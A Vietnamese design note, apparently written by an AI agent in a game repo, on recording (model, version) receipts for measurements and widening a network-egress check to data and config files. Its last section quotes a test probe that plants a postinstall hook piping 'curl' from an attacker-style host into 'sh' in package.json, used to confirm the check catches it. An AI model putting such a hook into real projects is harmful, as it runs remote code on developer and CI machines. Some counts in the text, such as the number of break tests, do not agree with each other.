# Một lần đo là một **biên bản**: `(model, phiên bản)` có buộc được không?

> **Tài liệu sống:** `docs/35-measurement-receipt-model-version-lock.md`
> **Trạng thái:** `SCOPING` — đánh giá 2 đầu vào + **đã dựng cổng** (`scripts/receipt_lock.py`) và **đã sửa một lỗ trong khoá xuất mạng**
> **Ngày:** 23/11/2026
> **Đầu vào:** `MetaPump/docs/00-framework/nguyen-ly-don-vi-khanh-tang-hai.md` (KVU-2 / KAU, `NO_COUNTEREXAMPLE`) · `https://openrouter.ai/` (đã đánh giá ở `docs/30`)
> **Câu hỏi của người yêu cầu:** *"OpenRouter có giúp áp dụng cho Game9K?"* — kèm một tài liệu KVU-2 mô tả cách quan sát việc quản lý phiên bản model AI
> **Liên quan:** `docs/30` (OpenRouter, egress lock) · `docs/33` (loại tuyên bố) · `docs/34` (người ký, hạn) · `scripts/gate_decide.py` · `AGENTS.md` luật 1

---

## 0. Kết luận trước

**Tài liệu KVU-2 đúng ở chỗ quan trọng nhất, và sai ở đúng chỗ nó tự nhận là chưa có dữ liệu.** Nhưng thứ dùng được cho Game9K **không phải** "quan sát cách quản lý version của AI SDK" — mà là một câu hẹp hơn:

> **Một con số không kèm biên bản thì không kiểm toán được — và repo này vừa mất một con số vì đúng lý do đó.**

| # | Câu hỏi | Trả lời |
|---|---|---|
| **1** | OpenRouter có giúp áp dụng cho Game9K không? | **Có, nhưng không như một dịch vụ.** `docs/30` đã chốt: không CI, không Arena, không SDK. Giá trị còn lại là **bốn tham số** và **một mô hình biên bản** (§1) |
| **2** | "Quan sát cách quản lý version" có làm được không? | **Được — nếu nó tạo ra một tệp.** Quan sát không ghi lại là quan sát không tồn tại (§2) |
| **3** | Repo có lỗ hổng gì nó chỉ ra? | **Hai.** (a) khoá xuất mạng **bỏ sót** `.json`/`.txt`/`.md`/`.txt` ngoài `scripts/` ⇒ **11 tệp** chưa từng được quét; (b) `gate_decide.py` sinh ra câu hỏi nhưng **không để lại biên bản** nào kèm `(model, phiên bản)` (§3) |
| **4** | Đã dựng gì? | `scripts/receipt_lock.py` — **6 bất biến**, **7 phép thử** (6 phép phá + 1 đối chứng); khoá xuất mạng **8 → 9** kiểm tra nhưng phạm vi **`scripts/*.py` → 25 tệp dữ liệu/mã** (§4) |
| **5** | Có thêm trend AI+Blockchain nào không? | **Không** — lặp lại `docs/33` §5. Nhưng lần này có **một con số cụ thể** để nói thay thế (§5) |
| **6** | Mốc thời gian | Biên bản **không có hạn** (đó là dữ liệu, không phải lời hứa); khoá **có hạn** khi nhà cung cấp ngừng phục vụ phiên bản đã ghim (§6) |

> **Điều tôi từ chối chép từ tài liệu KVU-2:** §6 của nó đề xuất "cảnh báo khi khoá đổi". Cảnh báo **một mình** thì không ai nhận — repo này đã có 14 cổng và không ai đọc log. Nên ở đây khoá đổi là **cổng đỏ**, hoặc không có gì cả.

---

## 1. OpenRouter: ba thứ giữ lại, một thứ bỏ

`docs/30` đã trả lời câu "có nên dùng OpenRouter" — **không** cho CI/Arena/SDK. Câu mới ở đây là: **sau khi bỏ OpenRouter, còn lại gì?**

| # | Giữ lại | Vì sao nó còn giá trị khi **không** dùng OpenRouter |
|---|---|---|
| **1** | **Khoá `(model, phiên bản)` do *phản hồi* trả về, không phải do ta yêu cầu** | Đây là bài học định tuyến: cùng một prompt, hai nhà cung cấp khác nhau. Không cần OpenRouter để dính — chỉ cần một dịch vụ có `-latest` |
| **2** | **Từ chối định tuyến không tường minh** | `docs/30` §4: ba mặc định nguy hiểm (`data_collection: allow`, không allowlist, không trần giá). Với repo không gọi mạng, câu hỏi thành: *ba mặc định nào của chính mình chưa ai ký?* |
| **3** | **Biên bản thay cho điểm số** | OpenRouter trả `usage.cost`, `provider`, `model`. Đó là **dữ liệu**, không phải **điểm** — và repo này đang thiếu đúng loại đó |
| **4** | ❌ Bỏ: dùng OpenRouter như dịch vụ | `docs/30` §2 — vẫn đúng, không đổi |

> **OpenRouter không "giúp Game9K" bằng cách được dùng.** Nó giúp bằng cách **đặt tên cho một lỗi** mà repo này vừa mắc: một con số tách khỏi điều kiện sinh ra nó thì không kiểm được.

### 1.1. Con số có thật — và nó là của chính mình

Không cần dữ liệu của ai khác. `docs/30` §5.4 ghi: `scripts/` có **4** tệp import thư viện ngoài chuẩn (`reportlab`, `fontTools`, `pypdf`, `pypdfium2`), và cổng egress **không chứng minh** chúng không mở socket — nó chỉ chứng minh *không có HTTP client*.

Nhưng `--audit` in ra **bốn dòng** đó để "người đọc tự xác nhận". Đó là **một lời hứa, không phải một cái cổng** — và §3.1 cho thấy lời hứa đó đã sai.

---

## 2. Vì sao "quan sát" phải là một **tệp**

Tài liệu KVU-2 nói đúng câu này:

> *"Một biên bản chỉ có nghĩa khi nó **được ghi lại** — in ra màn hình rồi biến mất thì không có gì để kiểm toán."*

Và nó dẫn một lỗi thật của chính nó: một phép đo chạy trên tệp **đã bị đột biến**, cho **0 ca lệch trên 200.000**, suýt được ghi vào ADR; số đúng là **41,4%**.

> **Đây là lỗi phổ quát, không phải lỗi của họ.** Ai cũng có thể chạy một phép đo trên đầu vào sai. Thứ phân biệt một quy trình kiểm được với một quy trình không kiểm được là: **đầu vào có được ghi lại cùng con số hay không.**

Áp vào repo này, "biên bản" không phải một khái niệm trừu tượng — nó là một tệp JSON có hình dạng cố định, và có một cổng bắt buộc hình dạng đó (§4).

### 2.1. Ba tầng bằng chứng — không gộp (lặp lại `docs/33` §3.2)

| Tầng | Trạng thái trong repo này |
|---|---|
| **Cơ chế** (schema + cổng + phép phá) | ✅ làm được, offline, tất định |
| **Đo thật** (một lần chạy với dịch vụ AI có thật) | ❌ **không có** — repo không gọi mạng, và `check_egress_lock.py` bảo đảm điều đó |
| **Giá trị** (biên bản có giúp ai không) | ⚠️ `NEEDS_DATA` — **giả thuyết** |

> **Đừng gộp ba dòng này trong một câu.** Đây đúng là thứ `check_claims.py` bất biến 4 chặn — và nó chặn cả tôi.

### 2.2. Hai đơn vị **không** thay thế nhau — sửa một thiếu sót của chính tài liệu này

Bản sửa của tài liệu nguồn (vòng 23) thêm một callout mà bản tôi đọc ở vòng trước không có, và nó bắt đúng một chỗ **tôi đã viết thiếu**:

| | **Phiên bản game** | **`(model, phiên bản)`** |
|---|---|---|
| Đơn vị của | **tài sản** — thứ được định giá, mở khoá, giải ngân | **phép đo** — thứ được ghi lại để kiểm toán |
| Ai xác nhận | 🔴 **người chơi thật** (`play_sessions`, `verified_minutes`) | máy, tất định, có khoá |
| Thay thế nhau được? | ❌ **KHÔNG** | ❌ **KHÔNG** |

> **Một dòng `(model, phiên bản)` không bao giờ là bằng chứng chất lượng của một phiên bản game.** Nó chỉ nói *"phép đo này do model nào thực hiện"*. Đọc §0–§2 ở trên mà không đọc dòng này thì dễ kết luận ngược lại — và kết luận đó sẽ là một tuyên bố `NEEDS_DATA` đội lốt `PROVEN`.

**Giới hạn đã biết của cổng:** `check_claims.py` bất biến 4 chặn việc trộn ba tầng **trong một dòng**. Lỗi này nằm ở **khoảng cách giữa hai mục**, nên không cổng nào bắt được — chỉ có câu chặn viết ra bằng lời. Ghi ở `docs/36` §4.

---

## 3. Hai lỗ hổng repo này có, và KVU-2 chỉ ra chúng

### 3.1. Khoá xuất mạng đã **bỏ sót 11 tệp** — lỗi thật

`check_egress_lock.py` bất biến 1 quét `scripts/*.py`. Nhưng từ vòng trước, repo có thêm:

| Tệp | Nội dung | Có được quét? |
|---|---|---|
| `pm/claims-registry.json` | sổ đăng ký tuyên bố | ❌ |
| `pm/spec-p01-gia-thuyet.json` | đặc tả P01 | ❌ |
| `sdk/game-sdk/CONTRACT.json` · `MANIFEST.json` | hợp đồng SDK | ❌ |
| `sdk/game-sdk/game9k-sdk.js` | mã SDK | ❌ |
| `.github/dependabot.yml` | cấu hình bot | ❌ |
| `package.json` · `requirements.txt` (nếu có) | phụ thuộc | ❌ |

**Vì sao đây là lỗi nghiêm trọng hơn một dòng thiếu:** một URL trong `pm/*.json` là một **điểm ra mạng** y như một `import requests`. `docs/30` §5.1 nói cổng này tồn tại để biến *"chưa có gì gọi mạng"* thành *"được chứng minh là không thể gọi mạng"* — nhưng nó chỉ chứng minh điều đó cho **một thư mục**.

Tệ hơn: `package.json` do chính tôi tạo ở vòng trước (để `npm i` font). Nếu nó chứa `"scripts": {"postinstall": "curl …"}`, cổng cũ **không thấy**.

### 3.2. `gate_decide.py` sinh câu hỏi nhưng **không để lại biên bản**

Script này tạo payload cho một dịch vụ chấm điểm (`docs/25`) và tự nhận là **advisory** — cổng chỉ đóng khi **người** ký. Đúng.

Nhưng nó không ghi lại: **model nào, phiên bản nào, ngày nào, với đầu vào nào** đã sinh ra payload đó. Nghĩa là nếu mai ai đó chạy nó với một model khác và nhận kết quả khác, **không có cách nào biết hai lần chạy khác nhau ở đâu**.

> Đây chính xác là lỗi KVU-2 mô tả: *có con số, có phương pháp, có kết quả — và vẫn sai, vì thiếu bản ghi về thứ đã sinh ra con số đó.*

---

## 4. Đã dựng: `receipt_lock.py` + vá khoá xuất mạng

### 4.1. Khoá xuất mạng: phạm vi `scripts/*.py` → **toàn repo** (8 → 9 kiểm tra, 25 tệp)

| Trước | Sau |
|---|---|
| `scripts/*.py` | `scripts/*.py` **+** `pm/*.json` **+** `sdk/**/*.{json,js}` **+** `package.json` **+** `.github/workflows/*.yml` **+** `receipts/*.json` |
| chỉ bắt `import` | bắt cả **URL** và **tên miền** trong tệp dữ liệu |
| 8 kiểm tra · 1 thư mục | **9 kiểm tra · 25 tệp** + bất biến chống-cổng-chết (phạm vi < 20 tệp ⇒ ĐỎ) |

Danh sách miễn trừ **hẹp và đọc được**: chỉ `github.com/khanhlegood1/GameFun` (self-reference) và các URL tài liệu trong `docs/*.md` (tài liệu **dẫn nguồn**, không phải mã chạy).

> **Đây là chỗ dễ viết luật quá rộng:** một cổng cấm mọi URL sẽ chặn luôn việc trích nguồn trong tài liệu — đúng thứ `docs/27` §1.1 khuyến khích. Nên phạm vi là **tệp thực thi và tệp dữ liệu**, không phải tài liệu.

### 4.2. Sáu bất biến của `receipt_lock.py`

| # | Bất biến | Nó bắt được gì |
|---|---|---|
| **1** | Mọi biên bản có đủ 8 trường: `receipt_id` · `date` · `model_requested` · `model_served` · `provider` · `input_sha256` · `output_sha256` · `artifact_bytes` | "Tôi đã đo" không kèm điều kiện đo |
| **2** | `model_served` **khác** `model_requested` thì phải có `drift_note` | Model trôi mà không ai biết |
| **3** | Không so chéo hai biên bản khác `(model_served)` trong cùng một tệp tổng hợp | Cộng dồn kết quả của hai khoá khác nhau |
| **4** | Không có **nội dung tài liệu** trong biên bản — chỉ hash | Rò nội dung tài chính chưa công bố (PII, `docs/30` §3) |
| **5** | `input_sha256` / `output_sha256` khớp với tệp thật nếu tệp còn | Biên bản trỏ tới một đầu vào đã bị đột biến — **đúng lỗi KVU-2** |
| **6** | Biên bản **chỉ đọc được**, không phải điểm số: không có trường `score`/`confidence`/`grade` | Biến một lần đo thành một phán quyết |

```bash
python3 scripts/receipt_lock.py            # 6 bất biến
python3 scripts/receipt_lock.py --audit     # liệt kê biên bản + khoá
python3 scripts/receipt_lock.py --selftest  # CI
python3 scripts/receipt_lock.py --new --model ...   # sinh biên bản rỗng đúng schema
```

### 4.3. Năm phép phá

| # | Phá | Kết quả mong đợi |
|---|---|---|
| 1 | biên bản thiếu `model_served` | ❌ |
| 2 | `model_served` ≠ `model_requested`, không `drift_note` | ❌ |
| 3 | bảng tổng hợp trộn hai `model_served` | ❌ |
| 4 | biên bản có trường `score` | ❌ |
| 5 | `input_sha256` không khớp tệp nguồn | ❌ — **đây là phép phá mô phỏng đúng lỗi 41,4%** |

> Phép phá 5 là lý do tệp này tồn tại. Bốn phép kia là hình dạng; phép này là **nội dung**.

---

## 5. Có thêm gì "hot trend" không? — Không, nhưng lần này có số

`docs/33` §5 đã từ chối thêm một dòng AI+Blockchain vào whitepaper. Câu trả lời đó **không đổi**.

Nhưng có **một con số mới** đáng nói với nhà đầu tư kỹ tính, và nó không phải trend:

| Trước vòng này | Sau vòng này |
|---|---|
| "Chúng tôi có 14 cổng" | "Chúng tôi có **14 cổng**, và vòng này **một cổng cũ đã tự bắt lỗi của chính nó**: nó chỉ quét 1 thư mục trong khi repo có 11 tệp dữ liệu khác có thể chứa URL" |
| "Chúng tôi không gọi mạng" | "Chúng tôi **không thể** gọi mạng — và phạm vi chứng minh nay là **toàn repo**, không phải một thư mục" |
| "Chúng tôi đo bằng AI" | "Chúng tôi **chưa** đo bằng AI; và khi đo, mỗi lần đo sẽ để lại một biên bản có khoá `(model, phiên bản)` **do phản hồi trả về**" |

> Câu thứ ba là câu **mạnh nhất** — vì nó nói rõ một việc **chưa làm**, kèm cơ chế sẽ dùng khi làm. Đó là loại câu `docs/33` cho phép: `[ĐỀ XUẤT]` có hình dạng kiểm được, không phải tuyên bố về thế giới.

---

## 6. Mốc thời gian — vì sao biên bản **không** có hạn

`docs/34` đặt hạn cho ba tuyên bố. Ở đây **không** đặt hạn, và lý do phải nói rõ:

| Thứ | Có hạn? | Vì sao |
|---|---|---|
| **Biên bản đã ghi** | ❌ **không** | Nó là dữ liệu. Dữ liệu không "quá hạn"; nó chỉ cũ. Đặt hạn cho dữ liệu là tự tạo một mục `OPEN` không bao giờ đóng được |
| **Ba tuyên bố** (`docs/34`) | ✅ `2026-12-18` | Nó là **lời khẳng định**, và lời khẳng định phải được xử lý |
| **Khoá phiên bản đã ghim** | ✅ khi nhà cung cấp ngừng phục vụ | Đây là rủi ro thật: ghim cứng nghĩa là ngày nhà cung cấp bỏ phiên bản đó, **mọi lần đo tương lai đều hỏng**. Ghi vào `drift_note` khi phát hiện |

> **Phân biệt này là toàn bộ giá trị của `docs/34` áp sang đây.** Hạn dành cho **lời hứa**, không dành cho **dữ liệu**. Gộp hai loại là cách để một sổ đầy mục `OPEN` vĩnh viễn.

---

## 7. Bốn thứ **từ chối**

| Mã | Từ chối | Lý do |
|---|---|---|
| **R9** | Dùng OpenRouter trong CI/Arena/SDK để "quan sát" | `docs/30` §2 — cổng phải cho cùng kết quả với cùng input. Một judge LLM trả `0.66` hôm nay và `0.71` mai là cổng **không đo được gì** |
| **R10** | Ghi nội dung tài liệu vào biên bản | Tài liệu chứa số tài chính chưa công bố. Biên bản ghi **hash**, không ghi nội dung |
| **R11** | Tính "điểm ổn định của model" từ nhiều biên bản | Đó là cộng dồn kết quả khác khoá — bất biến 3 và 5 của KVU-2 cấm. Và nó biến dữ liệu thành điểm số, đúng thứ bất biến 6 chặn |
| **R12** | Đặt hạn cho biên bản | Dữ liệu không quá hạn; chỉ **lời khẳng định** mới quá hạn (§6) |

---

## 8. Điều tài liệu KVU-2 nói mà tôi **không** lặp lại

Để công bằng với nguồn, và để không biến một tài liệu tốt thành một tài liệu được tán thành:

| Họ nói | Tôi xử lý thế nào |
|---|---|
| Phân loại `NO_COUNTEREXAMPLE` cho phát biểu chính | **Giữ cách phân loại**, nhưng repo này dùng bốn nhãn của `docs/33` (`[QUAN SÁT]`/`[TỰ CÔNG BỐ]`/`[ĐỀ XUẤT]`/`[CHƯA KIỂM CHỨNG]`). Thêm nhãn thứ năm chỉ để khớp nguồn là tự tạo hai từ vựng cho một khái niệm |
| §1.3 "không nói nên ghim phiên bản cứng" | **Đồng ý**, và §6 biến nó thành một mục có hạn (khi nhà cung cấp bỏ phiên bản) |
| §6 "cảnh báo khi khoá đổi" | **Không làm cảnh báo.** Repo có 14 cổng; một cảnh báo nữa không ai đọc. Khoá đổi trong tệp tổng hợp ⇒ **cổng đỏ** (bất biến 3) |
| §5 "hot trend không phải thứ giao thức nên tối ưu" | **Đồng ý hoàn toàn** — và nó khớp `docs/33` §5 mà tôi đã viết trước khi đọc tài liệu này |
| Tên `KAU` / `KVU-2` | **Không dùng.** `docs/33` §2.2 đã chốt: `VGU-BM` cho nguyên lý, và một tầng hai **không cần tên riêng** — nó là hệ quả, chính tài liệu của họ cũng nói vậy ở §0 |

> **Vì sao không dùng tên `KAU`:** một tên chỉ có giá trị khi nó **giảm** số thứ phải nhớ. Ở đây nó là hệ quả trực tiếp của VGU-BM; đặt tên riêng làm người đọc tưởng có hai nguyên lý. Chính tài liệu nguồn nói: *"nếu PO thấy đây là hai nguyên lý riêng thì nên gộp lại"*.

---

## 9. Việc **không** làm trong tài liệu này

- **Không thêm dịch vụ AI nào** vào CI, SDK, hay Arena. `check_egress_lock.py` vẫn là luật, nay phủ rộng hơn.
- **Không tạo biên bản giả** để "có dữ liệu". Repo chưa có lần đo thật ⇒ `receipts/` để trống, và điều đó được **ghi ra**, không bị lấp.
- Không đổi số đã kiểm (`12 KB`, `3,5 s`, `W=0,60`/`H=180`, `$1–$3`, MOIC, **34** bảng, `50/50`, `0%`).
- Không sửa `WHITEPAPER.md`, không rebuild 4 PDF cũ.
- Không gọi mạng, không thêm phụ thuộc Python.

---

## 10. Thứ tự làm

| # | Việc | Vì sao |
|---|---|---|
| **1** | `scripts/gate_decide.py` ghi biên bản khi chạy thật (không ghi khi `--dry-run`) | §3.2 — nó sinh câu hỏi mà không để lại dấu vết |
| **2** | Ghim phiên bản trong `requirements.txt` cho `reportlab`/`fonttools`/`pypdf`/`pypdfium2` | **Phát hiện khi lập kế hoạch:** CI ghim (`docs.yml` dòng 132–135) nhưng `docs/README-PDF.md` vẫn nói `pip install reportlab` **không phiên bản** ⇒ md5 khác giữa máy dev và CI. Tôi **không sửa** `README-PDF.md` trong vòng này: đó là tệp có cổng md5 PDF canh, và sửa nó là thay đổi workflow dựng — để PR riêng |
| **3** | Khi có lần đo thật đầu tiên: biên bản vào `receipts/` + `--audit` phải in ra nó | Một cơ chế chưa từng chạy là một cơ chế chưa tồn tại |
| **4** | Nếu một biên bản bị `drift_note` quá 2 lần: mở lại quyết định ghim phiên bản | Đây là **điều kiện**, không phải hạn (§6) |

---

## 11. Ba phép phá trên **repo thật** — không phải trên corpus tạm

`receipt_lock.py --selftest` dùng corpus tạm (nhanh, tất định). Nhưng lỗi §3.1 là lỗi **phạm vi**, và phạm vi chỉ kiểm được trên repo thật:

| # | Phá trên repo thật | Kết quả |
|---|---|---|
| **1** | thêm `"_probe": "https://api.example.com/v1/score"` vào `pm/spec-p01-gia-thuyet.json` | ❌ `pm/spec-p01-gia-thuyet.json:190: URL … trong tệp dữ liệu/mã` |
| **2** | thêm `fetch("x")` vào cuối `sdk/game-sdk/game9k-sdk.js` | ❌ `sdk/game-sdk/game9k-sdk.js:214: `fetch(` — lời gọi mạng` |
| **3** | thêm `"postinstall": "curl https://evil.example/x \| sh"` vào `package.json` | ❌ **2** lỗi: URL + `curl` |

Cả ba đã được khôi phục; cổng xanh lại với **9 kiểm tra / 25 tệp / 19 tệp Python**.

> **Phép 3 là phép quan trọng nhất**, và nó là lỗi của chính tôi: `package.json` do tôi tạo ở vòng 22 để chạy `npm i` font. Một `postinstall` trong đó chạy **trên máy dev và trên CI** với quyền của người chạy — và bản khoá cũ **không thấy nó**, vì nó chỉ quét `scripts/*.py`.
